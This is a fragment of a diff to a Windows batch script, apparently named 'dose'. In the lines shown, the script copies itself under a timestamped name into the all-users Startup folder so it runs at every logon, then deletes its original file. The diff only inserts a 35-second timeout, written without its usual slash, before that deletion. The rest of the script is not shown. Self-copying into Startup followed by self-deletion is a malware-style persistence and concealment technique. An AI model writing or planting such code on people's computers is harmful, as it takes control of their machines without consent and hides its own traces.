@@ -23,5 +23,5 @@ set "date=%YYYY%%MM%%DD%"
 set "time=%HH%%Min%%Sec%"
 
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\dose%date%%time%.bat"
-
+timeout /t 35 nobreak
 del %0
